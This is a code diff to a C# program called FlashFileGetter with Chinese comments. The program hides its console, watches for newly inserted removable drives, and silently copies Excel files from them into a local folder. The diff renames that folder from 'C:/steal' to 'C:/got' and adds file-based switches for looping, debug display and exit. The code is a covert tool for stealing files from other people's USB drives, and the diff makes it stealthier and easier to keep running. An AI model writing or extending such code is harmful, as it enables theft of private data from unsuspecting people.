@@ -34,9 +34,19 @@ namespace FlashFileGetter
             Console.WriteLine("[提示]开始运行");
             HideConsole(true);
 
-            while (FileGetted==false)
+            while (FileGetted == false || File.Exists(@"keeprunning.txt"))//主循环
             {
-                PatternChecker();
+                if (File.Exists("debug.txt") == true)//debug模式 (其中1处,共2)
+                {
+                    HideConsole(false);
+                }
+                else
+                {
+                    HideConsole(true);
+                }
+
+                PatternChecker();//检查盘符列表
+
                 if (NewDisk.Length > 0)
                 {
                     try
@@ -108,9 +118,9 @@ namespace FlashFileGetter
                 isDot = false;
                 Console.WriteLine("文件：" + filename + "类型:" + filekind);
 
-                if (Directory.Exists("C:/steal")==false)
+                if (Directory.Exists("C:/got") == false)
                 {
-                    Directory.CreateDirectory("C:/steal");
+                    Directory.CreateDirectory("C:/got");
                 }
                 //自行添加规则
                 try
@@ -118,20 +128,20 @@ namespace FlashFileGetter
                     switch (filekind)
                     {
                         case ".xls":
-                            File.Copy(filename, "C:/steal/" + realfilename);
+                            File.Copy(filename, "C:/got/" + realfilename);
                             break;
                         case ".xlsx":
-                            File.Copy(filename, "C:/steal/" + realfilename);
+                            File.Copy(filename, "C:/got/" + realfilename);
                             break;
-                        case ".jpeg":
-                            File.Copy(filename, "C:/steal/" + realfilename);
-                            break;
-                        case ".png":
-                            File.Copy(filename, "C:/steal/" + realfilename);
-                            break;
-                        case ".jpg":
-                            File.Copy(filename, "C:/steal/" + realfilename);
-                            break;
+                            //case ".jpeg":
+                            //    File.Copy(filename, "C:/got/" + realfilename);
+                            //    break;
+                            //case ".png":
+                            //    File.Copy(filename, "C:/got/" + realfilename);
+                            //    break;
+                            //case ".jpg":
+                            //    File.Copy(filename, "C:/got/" + realfilename);
+                            //    break;
                     }
                 }
                 catch (System.IO.IOException)
@@ -162,8 +172,23 @@ namespace FlashFileGetter
             string OldPatternList;
             string PatternList = "";
             Console.WriteLine("[检查盘符]");
+
             do
             {
+                if (File.Exists("exit.txt"))//如果收到指令 退出
+                {
+                    Environment.Exit(0);
+                }
+
+                if (File.Exists("debug.txt"))//debug模式 (其中2处,共2)
+                {
+                    HideConsole(false);
+                }
+                else
+                {
+                    HideConsole(true);
+                }
+
                 Console.WriteLine("获取盘符数:{0}", lastDriveCount);
                 //string[] Pattern = Directory.GetLogicalDrives();
                 //PatternList = "";
@@ -177,6 +202,7 @@ namespace FlashFileGetter
                 Thread.Sleep(1000);
             }
             while (Directory.GetLogicalDrives().Length == lastDriveCount);
+
             Console.WriteLine("[报告] 盘符数发生变化:{0}=>{1}", lastDriveCount, Directory.GetLogicalDrives().Length);
 
             PatternList = GetPatternList();
